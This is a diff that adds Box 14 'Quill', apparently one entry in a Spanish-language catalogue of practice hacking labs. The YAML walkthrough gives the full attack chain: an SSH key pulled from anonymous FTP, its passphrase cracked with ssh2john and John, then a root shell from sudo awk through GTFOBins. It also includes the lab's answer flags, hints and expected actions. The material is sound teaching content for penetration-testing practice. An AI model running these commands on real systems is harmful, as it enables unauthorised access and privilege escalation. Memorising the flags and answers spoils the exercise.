@@ -1017,6 +1017,66 @@ noise:
 
 ---
 
+## Box 14 — `Quill`
+
+```
+id: 14
+name: Quill
+os: linux
+difficulty: easy
+est_time: 20-30 min
+tags: [ftp-anon, exposed-ssh-key, ssh2john, sudo, gtfobins]
+
+target_ip: 10.10.14.112
+tun0_ip: 10.11.0.7
+
+services:
+  21: vsftpd 3.0.3 (anonymous allowed)
+  22: OpenSSH 8.2p1
+  80: Apache (web "Coming Soon" = relleno)
+
+surface:
+  - ftp-anon permitido -> /pub tiene id_rsa + note.txt (la nota dice que la key es de 'oliver').
+  - id_rsa con PASSPHRASE.
+
+chain:
+  - step: foothold-ftp-key
+    trigger: FTP anónimo con clave privada expuesta
+    technique: id_rsa expuesta -> crack passphrase -> SSH
+    cheat_ref: [[14-servicios]] (FTP) · [[05-cracking]] (ssh2john)
+    aha: la key pide passphrase -> ssh2john + John (hashcat 22921 NO carga OpenSSH moderna). chmod 600 antes.
+    expected_action: "get id_rsa; ssh2john id_rsa>hash; john --wordlist rockyou hash -> passphrase; chmod 600; ssh -i id_rsa oliver@IP"
+    hints:
+      - "FTP anónimo -> descarga todo. Una id_rsa en un share = login SSH."
+      - "pide passphrase -> se crackea offline: ssh2john + John."
+      - "ssh rechaza key 644 -> chmod 600. hashcat 22921 no carga OpenSSH moderna -> John."
+    resultado: SSH como oliver -> user flag
+  - step: privesc-sudo-gtfobins
+    trigger: sudo -l
+    technique: sudo NOPASSWD sobre binario GTFOBins
+    cheat_ref: [[07-privesc-linux]] (sudo / GTFOBins)
+    aha: `(root) NOPASSWD: /usr/bin/awk` -> GTFOBins awk
+    expected_action: "sudo /usr/bin/awk 'BEGIN{system(\"/bin/sh\")}'"
+    hints: ["árbol de privesc: sudo -l lo primero", "awk está en GTFOBins", "sudo awk 'BEGIN{system(\"/bin/sh\")}'"]
+    resultado: root
+
+creds:
+  - (id_rsa de oliver, passphrase crackeada con ssh2john+John) -> SSH oliver
+
+flags:
+  user: 1d9f0a2c7e634b8501f6a9c2d4b70e83
+  root: 3c0a5f172b9e4d86a0c1f93b7e2d6504
+
+noise:
+  - web 80 "Coming Soon" = relleno.
+  - SUID/caps estándar = baseline.
+  - error típico: olvidar chmod 600 a la key; o perder el tiempo con hashcat 22921 en una key OpenSSH moderna (usa John).
+```
+
+**Lección pedagógica:** FTP anónimo → **clave SSH expuesta**; **key con passphrase → `ssh2john` + John** (hashcat `-m 22921` NO carga OpenSSH moderna); `chmod 600` antes de `ssh -i`; y **`sudo -l` con binario NOPASSWD → GTFOBins** (`awk`, `vim`, `find`, `tar`… casi todos tienen línea a root).
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
